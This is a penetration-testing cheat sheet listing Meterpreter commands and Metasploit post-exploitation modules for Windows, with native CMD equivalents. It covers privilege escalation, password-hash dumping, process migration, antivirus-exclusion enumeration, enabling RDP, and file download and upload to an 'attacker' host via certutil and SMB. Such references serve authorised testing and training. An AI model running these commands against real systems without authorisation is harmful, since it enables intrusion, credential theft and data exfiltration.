
## Core Meterpreter Commands

```meterpreter
sysinfo                # Shows system information (OS, architecture, computer                               name, etc.)
getsystem              # Attempts to escalate privileges to SYSTEM
getsystem -h           # Displays help/usage for getsystem
getuid                 # Shows current user context
hashdump               # Dumps password hashes from the SAM database
show_mount             # Lists mounted drives/filesystems
ps                     # Lists running processes
migrate <ps_id> x64    # Migrates Meterpreter session to a specified x64 process                            PID
dir / ls / cd          # File system navigation (equivalent to Windows cmd)
upload / download      # Transfers files between attacker and target
```

---
## Post-Exploitation Modules

### Session Upgrades & Migration
```meterpreter
post/multi/manage/shell_to_meterpreter   # Upgrades a shell session to Meterpreter
post/windows/manage/migrate              # Automatically migrates to a suitable stable process
```

### Privilege & User Enumeration
```meterpreter
post/windows/gather/win_privs            # Enumerates current user privileges
post/windows/gather/enum_logged_on_users # Shows currently logged-on AND recently                                             logged-on users
```

### Virtual Machine Detection
```meterpreter
post/windows/gather/checkvm              # Detects if target is running inside a VM
                                         # (Note: Some advanced techniques may                                                exploit this to break out to host)
```

### Software & Patch Enumeration
```meterpreter
post/windows/gather/enum_applications    # Lists installed programs (useful for version-based exploits)
post/windows/gather/enum_patches         # Enumerates installed patches/updates
                                         # If fails due to Meterpreter process restrictions:
                                         # → Drop to `shell`, then run:
                                         #   C:\Windows\system32> systeminfo
```

### Domain & Network Recon
```meterpreter
post/windows/gather/enum_computers       # Enumerates domain computers
post/windows/gather/enum_shares          # Lists network shares on the target
```

### Security Product Enumeration
```meterpreter
post/windows/gather/enum_av_excluded     # Identifies AV solutions and their excluded directories
```

### Persistence & Access
```meterpreter
post/windows/manage/enable_rdp           # Enables Remote Desktop Protocol (RDP) on the target
                                         # After enabling, establish RDP session externally
```

### Data Exfiltration & Loot
```meterpreter
loot                                     # Lists all post-exploitation results saved in Metasploit's database
```

---
## Equivalent Native Windows CMD / Shell Commands

| **Meterpreter / Post Module**              | **Native Windows CMD Equivalent**                                                                                  |
| ------------------------------------------ | ------------------------------------------------------------------------------------------------------------------ |
| `sysinfo`                                  | `systeminfo`<br>`wmic os get caption,version`<br>`hostname && echo %USERDOMAIN%`                                   |
| `getuid`                                   | `whoami`<br>`echo %USERNAME%`                                                                                      |
| `hashdump`                                 | Not directly possible via CMD; requires tools like `reg save` + offline extraction or Mimikatz                     |
| `ps`                                       | `tasklist`                                                                                                         |
| `migrate`                                  | Not applicable — process injection requires external tooling (e.g., Cobalt Strike, custom loaders)                 |
| `dir` / `ls` / `cd`                        | `dir` / `cd`                                                                                                       |
| `upload` / `download`                      | `certutil -urlcache -f http://attacker/file localfile` (download)<br>`copy file \\attacker\share` (upload via SMB) |
| `post/windows/gather/enum_logged_on_users` | `query user`<br>`qwinsta`                                                                                          |
| `post/windows/gather/enum_applications`    | `wmic product get name,version`                                                                                    |
| `post/windows/gather/enum_patches`         | `wmic qfe list`                                                                                                    |
| `post/windows/gather/enum_computers`       | `net view /domain`<br>`nltest /dclist:%USERDOMAIN%`                                                                |
| `post/windows/gather/enum_shares`          | `net share` (local shares)<br>`net view \\%COMPUTERNAME%` (remote shares)                                          |
